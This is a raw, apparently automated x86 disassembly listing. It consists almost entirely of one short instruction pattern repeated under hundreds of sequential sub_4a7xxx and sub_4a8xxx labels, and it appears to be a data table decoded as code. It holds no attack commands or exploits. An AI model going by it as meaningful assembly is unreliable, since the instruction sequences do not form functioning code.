cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7488
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7490
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7498
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a74a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a74aa
inc eax
add [ ebx + esi * 8 - 0xa87ffc0 ] dl
inc eax
add [ eax + edi * 8 - 0x6ffffc0 ] cl
inc eax
add [ eax ] bh
0x4a
sub_4a74dd
or eax [ ecx ]
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a74e8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a74f0
add [ eax ] eax
add [ eax ] al
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a74fc
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4a750c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7514
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a751c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7524
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a752c
add [ eax ] eax
add [ eax ] al
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7538
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7540
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4a754c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7554
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a755c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7564
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a756c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7574
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a757c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7584
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a758c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7594
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a759c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a75a4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a75ac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a75b4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a75bc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a75c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a75f4
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4a7600
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7608
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7610
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7618
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7620
add [ eax ] eax
add [ eax ] al
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a762c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7634
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a763c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7644
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a764c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7654
add [ eax ] eax
add [ eax ] al
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7660
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
fadd [ edx + eax * 2 ]
and [ ebp + 0x42 ] al
add [ eax ] bh
0x4a
sub_4a7676
inc edx
add [ eax ] bh
0x4a
sub_4a767c
cmp dl cl
dec edx
add [ esi + eax * 2 + 0x42 ] al
add [ esi + eax * 2 + 0x42 ] bl
add [ esi + eax * 2 + 0x42 ] bh
add [ eax - 0x2bffbdba ] bh
inc esi
inc edx
add [ eax ] bh
0x4a
sub_4a7710
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7718
cmp dl cl
dec edx
add [ edi + ebx * 2 ] bl
inc edx
add [ eax - 0x3bffbda0 ] bl
pushad
inc edx
add [ eax + 0x62 ] dh
inc edx
add [ eax ] bh
0x4a
sub_4a7730
sbb al 0x64
inc edx
add al dh
inc edx
add [ eax ] bh
0x4a
sub_4a773c
pop eax
inc dx
add [ edx + ebp * 2 - 0x35c7ffbe ] ah
dec edx
add [ eax ] bh
0x4a
sub_4a774c
dec esp
imul eax [ edx ] 0xfffffff0
imul eax [ edx ] 0x58
insd
inc edx
add [ edi + esi * 2 ] bl
inc edx
add [ eax ] bh
0x4a
sub_4a777e
inc edx
add [ edx + ecx * 4 + 0x42 ] bl
add [ esp + ecx * 4 - 0x70ebffbe ] bl
inc edx
add [ eax ] bh
0x4a
sub_4a77c4
and [ edi - 0x5ff7ffbe ] bl
inc edx
add [ eax ] bh
0x4a
sub_4a7808
pop eax
mov esi 0xca380042
dec edx
add [ eax ] bh
0x4a
sub_4a7814
cmp dl cl
dec edx
add ah dl
mov edi 0xbffc0042
inc edx
add [ eax ] ah
rol [ edx ] 0x5c
rol [ edx ] 0x38
0x4a
sub_4a782d
rol [ edx ] 0xa4
mov [ edx ] r-xdata
cld
0x42
sub_4a783c
fmul st3
inc edx
add [ esp + ecx * 8 + 0x42 ] dl
add [ eax - 0x34 ] dh
inc edx
add [ eax + 0x380042cc ] bh
0x4a
sub_4a7850
ror ah 0x1
inc edx
add [ eax ] bl
aad 0x42
add [ eax + ebx * 8 - 0x35c7ffbe ] dl
dec edx
add [ eax - 0x24 ] dh
inc edx
add [ eax ] bh
0x4a
sub_4a7868
test bh bl
inc edx
add [ eax ] bh
0x4a
sub_4a7870
mov eax fs
inc edx
add al bl
loopne r-xdata
0x4a
add [ eax ] dl
loope r-xdata
0x4a
add [ eax ] bh
0x4a
sub_4a7880
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7888
dec eax
loope r-xdata
0x4a
add [ eax ] bh
0x4a
sub_4a7890
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7898
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a78a0
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4a78ac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a78b4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a78bc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a78c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a78cc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a78d4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a78dc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a78e4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a78ec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a78f4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a78fc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7904
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a790c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7914
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a791c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7924
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a792c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7934
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a793c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7944
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a794c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7954
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a795c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7964
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a796c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7974
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a797c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7984
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a798c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7994
add dl cl
inc eax
add al bh
0x40
sub_4a799c
xor al 0xcb
inc eax
add [ eax ] bh
0x4a
sub_4a79a4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a79ac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a79b4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a79bc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a79c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a79cc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a79d4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a79dc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a79e4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a79ec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a79f4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a79fc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a04
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a0c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a14
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a1c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a24
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a2c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a34
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a3c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a44
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a4c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a54
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a5c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a64
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a6c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a74
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a7c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a84
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a8c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a94
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7a9c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7aa4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7aac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ab4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7abc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ac4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7acc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ad4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7adc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ae4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7aec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7af4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7afc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b04
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b0c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b14
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b1c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b24
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b2c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b34
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b3c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b44
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b4c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b54
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b5c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b64
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b6c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b74
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b7c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b84
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7b8c
cmp dl cl
dec edx
add [ ebx + ecx * 8 + 0x40 ] ah
add [ ebx + ecx * 8 + 0x40 ] bh
add [ eax + 0x380040cb ] dh
0x4a
sub_4a7ba0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ba8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7bb0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7bb8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7bc0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7bc8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7bd0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7bd8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7be0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7be8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7bf0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7bf8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c00
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c08
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c10
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c18
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c20
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c28
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c30
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c38
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c40
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c48
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c50
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c58
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c60
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c68
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c70
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c78
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c80
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c88
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c90
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7c98
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ca0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ca8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7cb0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7cb8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7cc0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7cc8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7cd0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7cd8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ce0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ce8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7cf0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7cf8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d00
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d08
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d10
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d18
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d20
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d28
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d30
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d38
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d40
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d48
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d50
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d58
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d60
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d68
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d70
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d78
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d80
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d88
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d90
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7d98
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7da0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7da8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7db0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7db8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7dc0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7dc8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7dd0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7dd8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7de0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7de8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7df0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7df8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e00
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e08
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e10
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e18
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e20
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4a7e2c
sbb al 0xc8
inc eax
add [ eax ] bh
0x4a
sub_4a7e34
clc
enter 0x40 0x38
0x4a
sub_4a7e3c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e44
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e4c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e54
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e5c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e64
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e6c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e74
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e7c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e84
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e8c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e94
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7e9c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ea4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7eac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7eb4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ebc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ec4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ecc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ed4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7edc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ee4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7eec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ef4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7efc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f04
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f0c
cmp dl cl
dec edx
add [ eax - 0x37 ] dh
inc eax
add [ eax ] bh
0x4a
sub_4a7f18
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f20
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f28
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f30
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f38
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f40
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f48
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f50
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f58
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f60
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f68
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f70
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f78
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f80
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f88
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f90
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7f98
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7fa0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7fa8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7fb0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7fb8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7fc0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7fc8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7fd0
add [ eax ] eax
add [ eax ] al
shr [ edx + eax * 2 ] 0x1
add [ eax ] bh
0x4a
sub_4a7fdc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7fe4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7fec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ff4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7ffc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8004
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a800c
cmp dl cl
dec edx
add al cl
sub eax 0x2de00042
inc edx
add al bh
sub eax 0xca380042
dec edx
add [ eax ] bh
0x4a
sub_4a8024
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a802c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8034
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a803c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8044
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a804c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8054
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a805c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8064
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a806c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8074
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a807c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8084
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a808c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8094
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a809c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a80a4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a80ac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a80b4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a80bc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a80c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a80cc
cmp dl cl
dec edx
add [ eax ] bh
inc edx
add [ eax + 0x2e ] dl
inc edx
add [ eax ] bh
0x4a
sub_4a80dc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a80e4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a80ec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a80f4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a80fc
add [ eax ] eax
add [ eax ] al
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8108
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8110
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8118
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8120
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8128
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8130
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8138
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8140
cmp dl cl
dec edx
add [ eax - 0x37ffb5d8 ] ch
sub [ edx ] ecx
sub ecx [ fs : edx ]
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8158
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8160
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8168
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4a8178
pop eax
inc esp
add [ eax ] bh
0x4a
sub_4a8180
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a81ec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a81f4
or [ edi + 0x44 ] dh
add [ eax ] bh
0x4a
sub_4a822c
cmp dl cl
dec edx
add [ edx + ebx * 4 + 0x44 ] bl
add [ eax ] bh
0x4a
sub_4a8260
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4a8270
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8278
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8280
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8288
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8290
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8298
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a82a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a82a8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a82b0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a82b8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a82c0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a82c8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a82d0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a82d8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a82e0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a82e8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a82f0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a82f8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8300
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8308
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8310
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8318
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8320
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8328
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8330
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8338
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8340
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8348
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a8350
cmp dl cl
dec edx
